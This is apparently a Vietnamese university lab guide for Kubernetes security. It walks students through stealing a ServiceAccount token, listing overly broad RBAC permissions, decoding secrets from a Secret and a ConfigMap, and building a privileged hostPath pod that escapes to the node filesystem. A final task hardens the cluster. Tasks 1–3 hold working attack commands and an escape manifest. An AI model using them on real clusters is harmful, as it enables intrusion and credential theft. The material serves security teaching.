# HƯỚNG DẪN THỰC HÀNH — Bảo mật Kubernetes: RBAC quá rộng, secret lộ trong ConfigMap và pod escape

**Học viện Công nghệ Bưu chính Viễn thông — SecLab PTIT**

**Mức độ:** Nâng cao | **Phân loại:** Cloud Security / Container / DevSecOps
**Ánh xạ khung:** MITRE ATT&CK for Containers · CIS Kubernetes Benchmark · OWASP Kubernetes Top 10

---

## 1. Giới thiệu lab

| Thông tin | Chi tiết |
|---|---|
| **Tên Lab** | `cloud-k8s-rbac` |
| **Mức độ** | Nâng cao |
| **Công cụ sử dụng** | `kubectl`, `base64`, `jq`, `curl`; (audit) `kube-bench`, `kubesec`, `kube-linter` |
| **Kiến thức yêu cầu** | Cơ bản về Linux/Docker (container, filesystem, biến môi trường), cú pháp YAML, khái niệm HTTP/REST API. KHÔNG yêu cầu đã làm bài lab nào trước đó — các khái niệm Kubernetes cần thiết được nhắc lại trong mục 3. |

**Mục tiêu học tập**
- Hiểu mô hình phân quyền RBAC của Kubernetes (ServiceAccount, Role/ClusterRole, RoleBinding) và vì sao cấp quyền quá rộng là rủi ro nghiêm trọng.
- Nắm cơ chế ServiceAccount token được gắn tự động vào pod và cách kẻ tấn công lạm dụng token này để gọi API server.
- Phân biệt đúng vai trò của `ConfigMap` (dữ liệu cấu hình không nhạy cảm) và `Secret` (dữ liệu bí mật), hiểu vì sao để secret lẫn trong ConfigMap là anti-pattern.
- Hiểu cơ chế pod escape qua cấu hình nguy hiểm (`hostPath`, `privileged`) để truy cập filesystem của node.
- Biết cách hardening một cụm Kubernetes theo nguyên tắc least privilege và Pod Security Standards.

**Kỹ năng đạt được**
- Kỹ năng khai thác ServiceAccount token bị lộ và liệt kê quyền thực tế bằng `kubectl auth can-i`.
- Kỹ năng phát hiện và trích xuất secret nhạy cảm (kể cả secret bị để lẫn trong ConfigMap) và giải mã base64.
- Kỹ năng chế tác manifest pod độc hại (hostPath/privileged) để thoát khỏi ranh giới container và đọc dữ liệu trên node.
- Kỹ năng viết lại RBAC theo least privilege, tách secret ra khỏi ConfigMap, áp dụng Pod Security Standards và NetworkPolicy.
- Kỹ năng audit tĩnh manifest bằng `kube-linter`/`kubesec` và đối chiếu CIS Kubernetes Benchmark.

---

## 2. Kịch bản

**Tình huống:**
Một ứng dụng web chạy trong cụm Kubernetes nội bộ của công ty vừa bị chiếm quyền thực thi lệnh (RCE) — kẻ tấn công đã có shell trong pod `web-app` thuộc namespace `app`. Đây là điểm khởi đầu điển hình của một cuộc tấn công leo thang trong cụm: từ một pod bị chiếm, attacker tìm cách lạm dụng quyền được cấp cho pod để mở rộng phạm vi kiểm soát ra toàn cụm và cuối cùng là node bên dưới.

Cụm này mắc một chuỗi cấu hình sai phổ biến trong thực tế: ServiceAccount của pod được gán RBAC **quá rộng** (được `list/get secrets` và `create pods` trong namespace), một **secret nhạy cảm bị nhân bản/để lẫn trong ConfigMap** (lập trình viên tưởng ConfigMap là nơi an toàn), và cụm **không có Pod Security Standards** nên cho phép tạo pod `privileged`/`hostPath` tùy ý. Nạn nhân là flag đặt trên filesystem của node — chỉ đọc được sau khi attacker vừa lạm quyền RBAC vừa thoát ra được node.

**Vai trò của sinh viên:**
Sinh viên đóng vai **attacker** đã có shell trong pod `web-app`, thực hiện:
1. Trinh sát in-cluster: đọc ServiceAccount token, dùng `kubectl` liệt kê quyền RBAC thực tế của pod.
2. Thu thập bí mật: đọc secret qua API, đồng thời phát hiện secret bị để lẫn trong ConfigMap và giải mã.
3. Pod escape: tạo một pod độc hại (hostPath mount `/` của node, hoặc privileged) để đọc filesystem của node và lấy flag.
4. **Đội mũ DevSecOps (hardening):** đề xuất và áp dụng biện pháp khắc phục toàn bộ chuỗi lỗ hổng.

**Sơ đồ mạng / cụm (mô tả text):**

```
                        Mạng ảo Labtainer 172.25.0.0/24
 ┌─────────────────────────────────────────────────────────────────────────┐
 │                                                                           │
 │   [attacker]  172.25.0.10                                                 │
 │   kubectl / base64 / jq / curl                                           │
 │   (nơi sinh viên gõ lệnh; mô phỏng shell trong pod web-app bị chiếm)      │
 │        │                                                                  │
 │        │  kubectl / curl  --token=<SA token>                             │
 │        ▼                                                                  │
 │   [k8s-node]  172.25.0.20   (k3s 1 node — vừa control-plane vừa worker)   │
 │     ├─ API server  :6443                                                  │
 │     ├─ namespace app:                                                     │
 │     │     ├─ pod web-app        (ServiceAccount: web-sa  ← RBAC quá rộng) │
 │     │     ├─ ConfigMap app-config   (LẪN secret nhạy cảm)                 │
 │     │     └─ Secret db-credentials  (secret DB)                          │
 │     └─ FILESYSTEM NODE:  /opt/host-secrets/flag.txt   ← MỤC TIÊU          │
 │                                                                           │
 └─────────────────────────────────────────────────────────────────────────┘

 Luồng khai thác:  đọc SA token  →  liệt kê RBAC (list secrets / create pods)
                   →  đọc Secret + ConfigMap lộ secret
                   →  tạo pod hostPath/privileged  →  đọc flag trên node
```

> Ghi chú: `attacker` và `k8s-node` có thể là hai container riêng, hoặc gộp làm một tùy phương án triển khai (xem mục Ghi chú triển khai). Về mặt logic sinh viên luôn thao tác từ góc nhìn "bên trong pod bị chiếm".

---

## 3. Kiến thức bổ trợ

### Kiến thức nền tảng

- **Kubernetes (K8s):** hệ điều phối container. Đơn vị nhỏ nhất là **pod** (một hoặc vài container). Tài nguyên được nhóm theo **namespace**. Người dùng/dịch vụ tương tác với cụm qua **API server** (REST trên cổng 6443) bằng công cụ `kubectl`.
- **ServiceAccount (SA):** danh tính (identity) dành cho tiến trình chạy trong pod. Mặc định mỗi pod được gắn token của một SA tại đường dẫn `/var/run/secrets/kubernetes.io/serviceaccount/`. Token này (JWT) là "chìa khóa" để pod gọi API server — nếu pod bị chiếm, token cũng bị chiếm.
- **RBAC (Role-Based Access Control):** cơ chế phân quyền. `Role`/`ClusterRole` định nghĩa *được làm gì* (verbs như `get`, `list`, `create`, `delete` trên resources như `pods`, `secrets`); `RoleBinding`/`ClusterRoleBinding` *gán* Role đó cho một subject (user/SA/group). **Lỗ hổng RBAC quá rộng** xảy ra khi SA của một ứng dụng bình thường lại được cấp các quyền nguy hiểm như `list secrets` (đọc mọi bí mật) hoặc `create pods` (tạo pod tùy ý — bàn đạp để escape).
- **ConfigMap vs Secret:** `ConfigMap` dùng cho cấu hình *không nhạy cảm* và lưu **plaintext**; `Secret` dùng cho dữ liệu bí mật, giá trị được mã hóa **base64** (lưu ý: base64 chỉ là mã hóa chuyển dạng, KHÔNG phải mã hóa bảo mật) và nên bật **encryption at-rest** ở etcd. Anti-pattern phổ biến: nhét mật khẩu/token vào ConfigMap vì tưởng "chỉ nội bộ mới xem được".
- **Container escape qua hostPath/privileged:** `hostPath` volume mount một thư mục của **node** vào trong pod — nếu mount `/` hoặc `/opt/...` thì pod đọc/ghi được filesystem node. `privileged: true` (hoặc thêm capability như `SYS_ADMIN`) gỡ bỏ phần lớn cách ly giữa container và host, cho phép truy cập thiết bị và namespace của node. Cả hai đều là con đường kinh điển để "thoát" từ pod ra node.
- **Pod Security Standards (PSS):** chuẩn bảo mật pod của Kubernetes gồm 3 mức `privileged` / `baseline` / `restricted`, áp qua **Pod Security Admission** ở cấp namespace. Mức `restricted`/`baseline` sẽ *từ chối* pod dùng `privileged`, `hostPath`, chạy root... — đây là hàng rào chính chặn bước escape.
- **NetworkPolicy:** "firewall" cấp pod, giới hạn luồng mạng ingress/egress giữa các pod — giúp hạn chế di chuyển ngang và chặn pod ứng dụng gọi trực tiếp API server nếu không cần.

### Thành phần cần quan sát trong bài lab

| Thành phần | Vai trò |
|---|---|
| ServiceAccount `web-sa` (token trong pod) | Danh tính của pod bị chiếm; token gắn tại `/var/run/secrets/kubernetes.io/serviceaccount/token`. |
| RBAC gán cho `web-sa` | Cấu hình sai trung tâm: cho phép `list/get secrets` và `create pods` — quá rộng so với nhu cầu của một web app. |
| `Secret/db-credentials` (ns `app`) | Bí mật DB, đọc được vì RBAC quá rộng; giá trị mã hóa base64. |
| `ConfigMap/app-config` (ns `app`) | Chứa cấu hình ứng dụng nhưng lẫn cả secret nhạy cảm (plaintext) — nguồn lộ thứ hai. |
| Manifest pod độc hại (do sinh viên tạo) | Pod dùng `hostPath` mount `/` của node hoặc `privileged` để escape. |
| `/opt/host-secrets/flag.txt` trên node | Flag mục tiêu — chỉ đọc được sau khi tạo được pod escape và truy cập filesystem node. |

### Bảng công cụ & cú pháp

| Công cụ | Tùy chọn / Cú pháp | Mô tả tác dụng |
|---|---|---|
| `kubectl` | `kubectl --token=<TOKEN> --server=https://<IP>:6443 --insecure-skip-tls-verify get <res>` | Gọi API server với token của SA bị chiếm (dùng khi cần chỉ định token thủ công). |
| `kubectl` | `kubectl auth can-i --list -n <ns>` | Liệt kê **toàn bộ** quyền thực tế của danh tính hiện tại trong namespace — công cụ recon RBAC quan trọng nhất. |
| `kubectl` | `kubectl auth can-i <verb> <resource> -n <ns>` | Kiểm tra một quyền cụ thể, ví dụ `create pods`, `list secrets`. |
| `kubectl` | `kubectl get secrets -n <ns>` / `kubectl get secret <name> -n <ns> -o json` | Liệt kê / đọc chi tiết secret (giá trị dạng base64 trong trường `.data`). |
| `kubectl` | `kubectl get configmap <name> -n <ns> -o yaml` | Đọc nội dung ConfigMap (plaintext) để phát hiện secret bị để lẫn. |
| `kubectl` | `kubectl apply -f <pod.yaml>` / `kubectl exec -it <pod> -- <cmd>` | Tạo pod từ manifest và thực thi lệnh trong pod (dùng để escape). |
| `base64` | `echo <chuoi> \| base64 -d` | Giải mã giá trị base64 lấy từ trường `.data` của Secret. |
| `jq` | `kubectl get secret <name> -n <ns> -o json \| jq -r '.data'` | Lọc/định dạng JSON trả về từ API cho dễ đọc. |
| `curl` | `curl -sk -H "Authorization: Bearer <TOKEN>" https://<IP>:6443/api/v1/namespaces/<ns>/secrets` | Gọi trực tiếp REST API server bằng token (minh họa API bên dưới `kubectl`). |
| `kube-linter` | `kube-linter lint <manifest.yaml>` | (Phương án audit) Kiểm tra tĩnh manifest, phát hiện privileged/hostPath/thiếu securityContext. |
| `kubesec` | `kubesec scan <pod.yaml>` | (Phương án audit) Chấm điểm rủi ro cấu hình pod. |
| `kube-bench` | `kube-bench run` | (Phương án audit) Đối chiếu cấu hình cụm với CIS Kubernetes Benchmark. |

---

## 4. Các nhiệm vụ của bài thực hành

Để tải bài thực hành, sinh viên thực hiện câu lệnh:

```bash
imodule https://github.com/namlt04/do-an-2026/raw/refs/heads/master/imodule/cloud-k8s-rbac.tar
```

Để khởi động bài thực hành, sinh viên dùng câu lệnh:

```bash
labtainer cloud-k8s-rbac
```

*(Chú ý: sinh viên sử dụng mã sinh viên của mình để nhập thông tin email người thực hiện bài lab khi có yêu cầu, để sử dụng khi chấm điểm.)*

Sau khi khởi động xong, một terminal ảo sẽ xuất hiện, đại diện cho **shell của attacker bên trong pod `web-app` đã bị chiếm** (`attacker`). Từ đây `kubectl` đã được cấu hình để trỏ tới API server của cụm bằng chính token của ServiceAccount `web-sa`.

---

### Nhiệm vụ 1 — `recon_rbac`: Đọc ServiceAccount token và liệt kê quyền RBAC quá rộng

**Mục tiêu:** Từ trong pod bị chiếm, xác định pod đang mang danh tính SA nào và liệt kê chính xác các quyền mà SA đó được cấp — phát hiện quyền nguy hiểm (`list secrets`, `create pods`).

**Bước 1:** Xác nhận đang ở trong pod và đọc thông tin ServiceAccount được gắn tự động:
```bash
ls -l /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

**Bước 2:** Trích xuất token JWT của SA (đây là "chìa khóa" gọi API server):
```bash
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
echo "$TOKEN" | cut -c1-40   # xem 40 ký tự đầu để xác nhận có token
```

**Bước 3:** Xác định danh tính hiện tại (SA name) mà token đại diện:
```bash
kubectl auth whoami 2>/dev/null || \
  echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
```
*(Trường `sub` trong payload JWT có dạng `system:serviceaccount:app:web-sa`.)*

**Bước 4:** Liệt kê **toàn bộ** quyền thực tế của SA trong namespace `app`:
```bash
kubectl auth can-i --list -n app
```

**Bước 5:** Kiểm tra riêng hai quyền nguy hiểm nghi ngờ:
```bash
kubectl auth can-i list secrets -n app
kubectl auth can-i create pods -n app
```
Kết quả `yes` cho cả hai xác nhận RBAC của `web-sa` bị cấp **quá rộng** so với nhu cầu của một ứng dụng web.

**Điều kiện hoàn thành nhiệm vụ:** Đã trích xuất được SA token; lệnh `kubectl auth can-i --list -n app` chạy thành công và xác nhận SA `web-sa` có đồng thời quyền `list secrets` và `create pods` (hai lệnh `auth can-i` ở Bước 5 trả về `yes`).

**Câu hỏi 1:** Một ứng dụng web thông thường (chỉ phục vụ HTTP) thì thực sự cần những quyền RBAC nào, và vì sao việc cấp cho nó quyền `create pods` lại nguy hiểm hơn nhiều so với quyền `get` một ConfigMap cấu hình của chính nó?
Trả lời: _______________________________________

---

### Nhiệm vụ 2 — `loot_secrets`: Đọc secret qua API và phát hiện secret lộ trong ConfigMap

**Mục tiêu:** Lạm dụng quyền `list/get secrets` để đọc bí mật, đồng thời phát hiện một secret nhạy cảm bị lập trình viên để lẫn (plaintext) trong ConfigMap.

**Bước 1:** Liệt kê các secret trong namespace `app`:
```bash
kubectl get secrets -n app
```

**Bước 2:** Đọc chi tiết secret `db-credentials` (giá trị nằm trong `.data`, mã hóa base64):
```bash
kubectl get secret db-credentials -n app -o json | jq -r '.data'
```

**Bước 3:** Giải mã các trường base64 để lấy giá trị gốc:
```bash
kubectl get secret db-credentials -n app -o jsonpath='{.data.password}' | base64 -d ; echo
kubectl get secret db-credentials -n app -o jsonpath='{.data.username}' | base64 -d ; echo
```

**Bước 4:** (Tùy chọn — minh họa lớp REST bên dưới) Đọc secret trực tiếp qua API server bằng token:
```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://<IP_API_SERVER>:6443/api/v1/namespaces/app/secrets | jq '.items[].metadata.name'
```

**Bước 5:** Rà soát ConfigMap của ứng dụng — nơi lập trình viên thường vô tình để lộ bí mật:
```bash
kubectl get configmap app-config -n app -o yaml
```

**Bước 6:** Lọc nhanh các từ khóa nhạy cảm trong ConfigMap:
```bash
kubectl get configmap app-config -n app -o yaml | grep -iE 'pass|token|secret|key|cred'
```
ConfigMap chứa một giá trị nhạy cảm dạng plaintext (ví dụ một API token của dịch vụ nội bộ) — đây là nguồn lộ thứ hai, nguy hiểm vì ConfigMap không được coi là bí mật nên thường ít được bảo vệ và dễ bị log/commit nhầm.

**Điều kiện hoàn thành nhiệm vụ:** Đã giải mã thành công username/password từ `Secret/db-credentials` (không còn dạng base64), VÀ trích xuất được giá trị nhạy cảm plaintext bị để lẫn trong `ConfigMap/app-config`.

**Câu hỏi 2:** Giá trị trong trường `.data` của một Secret được mã hóa base64. Điều này có làm cho Secret "an toàn hơn" ConfigMap về mặt bảo mật hay không? Hãy nêu ít nhất hai khác biệt bảo mật thực sự giữa Secret và ConfigMap (gợi ý: encryption at-rest, phân quyền RBAC, cách hiển thị khi mô tả tài nguyên).
Trả lời: _______________________________________

---

### Nhiệm vụ 3 — `escape_node`: Tạo pod hostPath/privileged để thoát ra node và lấy flag

**Mục tiêu:** Lạm dụng quyền `create pods` để triển khai một pod độc hại mount filesystem của node, từ đó đọc flag đặt tại `/opt/host-secrets/flag.txt` trên node.

**Bước 1:** Soạn manifest pod độc hại mount `/` của node vào trong pod qua `hostPath`:
```bash
cat > /tmp/escape.yaml <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: maintenance-shell
  namespace: app
spec:
  containers:
  - name: shell
    image: <IMAGE_CO_SAN_TRONG_CUM>     # ví dụ busybox/alpine đã cache sẵn
    command: ["sh", "-c", "sleep 3600"]
    securityContext:
      privileged: true                   # (tùy chọn) gỡ cách ly container-node
    volumeMounts:
    - name: nodefs
      mountPath: /host                    # thư mục / của node sẽ xuất hiện ở /host
  volumes:
  - name: nodefs
    hostPath:
      path: /                             # mount toàn bộ filesystem node
EOF
```

**Bước 2:** Triển khai pod và chờ pod ở trạng thái `Running`:
```bash
kubectl apply -f /tmp/escape.yaml
kubectl get pod maintenance-shell -n app -w   # Ctrl+C khi đã Running
```

**Bước 3:** Vào pod và truy cập filesystem của node qua điểm mount `/host`:
```bash
kubectl exec -it maintenance-shell -n app -- sh
# bên trong pod:
ls -l /host/opt/host-secrets/
cat /host/opt/host-secrets/flag.txt
```

**Bước 4:** Ghi flag ra file kết quả để hệ thống chấm điểm thu nhận (chạy ở shell attacker):
```bash
kubectl exec maintenance-shell -n app -- cat /host/opt/host-secrets/flag.txt | tee ~/flag.txt
```

**Điều kiện hoàn thành nhiệm vụ:** Pod `maintenance-shell` được tạo thành công (trạng thái `Running`) và nội dung `/opt/host-secrets/flag.txt` trên node được đọc ra; chuỗi flag đúng định dạng xuất hiện trong output/`~/flag.txt`.

**Câu hỏi 3:** Trong manifest trên, hãy chỉ ra hai thuộc tính khiến pod này trở nên nguy hiểm. Nếu cụm CHỈ chặn `privileged: true` nhưng vẫn cho phép `hostPath`, kẻ tấn công còn escape ra node được không? Vì sao?
Trả lời: _______________________________________

---

### Nhiệm vụ 4 — `harden_cluster`: Khắc phục toàn bộ chuỗi lỗ hổng (DevSecOps)

**Mục tiêu:** Đội mũ kỹ sư DevSecOps, vá tận gốc cả ba lớp lỗ hổng đã khai thác: RBAC quá rộng, secret lộ trong ConfigMap, và pod cấu hình nguy hiểm. Sau khi hardening, chuỗi tấn công ở Nhiệm vụ 1–3 phải bị chặn.

**Bước 1 — RBAC least privilege:** Thay Role quá rộng của `web-sa` bằng Role tối thiểu (chỉ `get` đúng ConfigMap ứng dụng cần, KHÔNG secrets, KHÔNG create pods):
```bash
cat > /tmp/least-priv-role.yaml <<'EOF'
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: app
  name: web-app-minimal
rules:
- apiGroups: [""]
  resources: ["configmaps"]
  resourceNames: ["app-config"]      # chỉ đúng configmap của app
  verbs: ["get"]
EOF
kubectl apply -f /tmp/least-priv-role.yaml
# gỡ binding cũ (quá rộng) và gắn binding mới:
kubectl delete rolebinding web-sa-binding -n app
kubectl create rolebinding web-sa-minimal -n app \
  --role=web-app-minimal --serviceaccount=app:web-sa
```
Kiểm chứng: `kubectl auth can-i list secrets -n app --as=system:serviceaccount:app:web-sa` phải trả về `no`; tương tự với `create pods`.

**Bước 2 — Tách secret khỏi ConfigMap:** Loại bỏ giá trị nhạy cảm khỏi `ConfigMap/app-config`, chuyển vào một Secret riêng, và (nếu phương án cho phép) bật encryption at-rest cho etcd:
```bash
# xóa key nhạy cảm khỏi configmap (chỉ giữ cấu hình không nhạy cảm)
kubectl create secret generic internal-api --from-literal=token='<GIA_TRI_MOI>' -n app
kubectl patch configmap app-config -n app --type=json \
  -p='[{"op":"remove","path":"/data/internal_api_token"}]'
```
Kiểm chứng: `kubectl get configmap app-config -n app -o yaml | grep -iE 'token|secret|pass'` không còn trả về giá trị nhạy cảm.

**Bước 3 — Pod Security Standards + chặn hostPath/privileged:** Áp Pod Security Admission mức `restricted` cho namespace `app`:
```bash
kubectl label namespace app \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/enforce-version=latest --overwrite
```
Kiểm chứng: thử `kubectl apply -f /tmp/escape.yaml` lại — API server phải **từ chối** vì vi phạm chuẩn `restricted` (privileged/hostPath không được phép).

**Bước 4 — NetworkPolicy hạn chế:** Áp policy chặn egress không cần thiết của pod ứng dụng (ví dụ chỉ cho phép ra DNS + dịch vụ cần thiết, chặn truy cập trực tiếp API server nếu ứng dụng không cần):
```bash
cat > /tmp/netpol.yaml <<'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: web-app-egress
  namespace: app
spec:
  podSelector:
    matchLabels:
      app: web-app
  policyTypes: ["Egress"]
  egress:
  - to: []
    ports:
    - protocol: UDP
      port: 53          # chỉ cho phép DNS; điều chỉnh theo nhu cầu thực tế
EOF
kubectl apply -f /tmp/netpol.yaml
```

**Bước 5 — Xác minh tổng thể:** Chạy lại chuỗi tấn công của Nhiệm vụ 1–3 để chứng minh đã bị chặn:
```bash
kubectl auth can-i list secrets -n app --as=system:serviceaccount:app:web-sa   # kỳ vọng: no
kubectl auth can-i create pods -n app --as=system:serviceaccount:app:web-sa    # kỳ vọng: no
kubectl apply -f /tmp/escape.yaml                                              # kỳ vọng: bị từ chối
```

**Điều kiện hoàn thành nhiệm vụ:** Sau hardening: (1) `web-sa` không còn quyền `list secrets` và `create pods` (trả về `no`); (2) `ConfigMap/app-config` không còn chứa giá trị nhạy cảm; (3) việc tạo lại pod `escape.yaml` bị API server từ chối do vi phạm Pod Security `restricted`. Cả ba điều kiện đo được qua output lệnh ở Bước 5.

**Câu hỏi 4:** Trong bốn biện pháp trên, biện pháp nào là "phòng thủ theo chiều sâu" cho bước escape (Nhiệm vụ 3) và biện pháp nào vá "nguyên nhân gốc" của việc leo thang (Nhiệm vụ 1)? Nếu chỉ được chọn triển khai một biện pháp duy nhất trước, bạn chọn biện pháp nào và vì sao?
Trả lời: _______________________________________

---

## 5. Ghi chú triển khai (cho người xây lab)

### Container / thành phần cần dựng
- `attacker` (nơi sinh viên gõ lệnh): cài `kubectl`, `base64` (coreutils), `jq`, `curl`. `~/.kube/config` (hoặc biến môi trường) được cấu hình sẵn trỏ tới API server với token của `web-sa`, mô phỏng đúng ngữ cảnh "shell trong pod bị chiếm". Cần đặt sẵn file `/var/run/secrets/kubernetes.io/serviceaccount/{token,namespace,ca.crt}` để Nhiệm vụ 1 đọc được như pod thật.
- `k8s-node`: node Kubernetes 1 node (xem hai phương án bên dưới), chứa sẵn: namespace `app`; ServiceAccount `web-sa` + Role/RoleBinding **quá rộng** (`list/get secrets`, `create pods`); `Secret/db-credentials`; `ConfigMap/app-config` (lẫn secret plaintext); flag đặt tại `/opt/host-secrets/flag.txt` trên filesystem node.
- **Flag/goal dự kiến:** `recon_rbac` (xác nhận quyền quá rộng), `loot_secrets` (giải mã secret + trích secret trong ConfigMap), `escape_node` (chuỗi flag từ node — flag chính, tham số hóa theo mã sinh viên), `harden_cluster` (đo trạng thái sau khắc phục qua `auth can-i` = no và pod bị từ chối). Chấm điểm dựa trên bash history + stdout + file `~/flag.txt`.

### Hai phương án triển khai và trade-off tài nguyên (QUAN TRỌNG)

Kubernetes có thể **nặng** đối với một VM Labtainer. Đề xuất hai phương án, ưu tiên A; nếu VM yếu thì dùng B.

**Phương án A — Cụm thật, 1 node nhẹ (k3s hoặc kind).** *Khuyến nghị nếu VM đủ khỏe.*
- **k3s** (ưu tiên): binary đơn, nhẹ hơn Kubernetes chuẩn, tắt bớt thành phần không cần (`--disable traefik,servicelb,metrics-server`), dùng SQLite thay etcd. Chạy được như một container/systemd trong Labtainer; node chính là container `k8s-node`. hostPath mount `/` của node = filesystem của chính container k3s, nơi đặt flag — mô phỏng escape rất sát thực tế.
- **kind** (Kubernetes-in-Docker): sát bản K8s upstream hơn nhưng cần Docker-in-Docker, thường **nặng hơn** k3s trong ngữ cảnh Labtainer → chỉ chọn khi cần đúng behavior upstream (ví dụ Pod Security Admission bản mới).
- **Tài nguyên:** khuyến nghị tối thiểu ~2 vCPU / 2–3 GB RAM cho VM. Dùng khai báo `NUM CPUS` / `CPU SET` trong `start.config` để giới hạn CPU container k3s, tránh chiếm hết máy sinh viên. Dùng image container nhẹ có sẵn trong cụm (busybox/alpine đã cache) cho pod escape để không phải kéo image online (Labtainer chạy offline). Startup cụm có thể chậm → cân nhắc `WAIT FOR` để `attacker` chờ `k8s-node` sẵn sàng.
- **Trade-off:** trải nghiệm chân thực nhất (kubectl thật, RBAC thật, escape thật) nhưng tốn RAM/CPU và thời gian khởi động; rủi ro trên máy sinh viên yếu.

**Phương án B — Audit tĩnh manifest + mô phỏng API.** *Dự phòng khi VM quá yếu.*
- Không chạy cụm thật. Cung cấp sẵn tập manifest YAML (Role/RoleBinding quá rộng, Secret, ConfigMap lẫn secret, pod hostPath/privileged) và cho sinh viên **audit tĩnh** bằng `kube-linter`, `kubesec`, đối chiếu `kube-bench`/CIS. Bước "gọi API" được mô phỏng bằng một **HTTP server giả** đóng vai API server: trả JSON tương tự `kubectl get secrets`/`auth can-i` để sinh viên vẫn thực hành đọc token → liệt kê quyền → đọc secret. Flag đặt trong một file trên `k8s-node` mà chỉ manifest pod escape "đúng" mới trỏ tới (chấm bằng cách kiểm tra manifest sinh viên nộp có hostPath tới đường dẫn flag + kiểm tra chuỗi flag do server giả phát khi manifest hợp lệ).
- **Tài nguyên:** rất nhẹ (chỉ vài tiến trình Python/HTTP + công cụ CLI cài offline), khởi động nhanh, chạy tốt trên VM cấu hình thấp.
- **Trade-off:** mất tính "escape thật" và phản hồi động của cụm; phần khai thác mang tính mô phỏng và phần hardening được đánh giá qua *audit lại manifest đã sửa* thay vì hành vi thời gian chạy. Bù lại nhấn mạnh kỹ năng đọc/đánh giá manifest theo CIS/OWASP — vẫn bám sát mục tiêu học tập bảo mật.

**Khuyến nghị cuối:** triển khai **Phương án A với k3s 1 node** làm mặc định; đóng gói kèm **Phương án B** như chế độ dự phòng để giảng viên chọn tùy cấu hình phòng máy. Ghi rõ yêu cầu tài nguyên trong README của lab để sinh viên biết trước.

### Ánh xạ khung tham chiếu
- **MITRE ATT&CK for Containers:** T1552.001/T1528 (đánh cắp token/SA token), T1613 (Container & Resource Discovery — `auth can-i`), T1610 (Deploy Container — tạo pod độc hại), T1611 (Escape to Host — hostPath/privileged).
- **OWASP Kubernetes Top 10:** K01 Insecure Workload Configurations (privileged/hostPath), K03 Overly Permissive RBAC, K08 Secrets Management Failures (secret trong ConfigMap).
- **CIS Kubernetes Benchmark:** mục về minimize RBAC, Pod Security Standards, không dùng hostPath/privileged, encryption at-rest cho secrets.
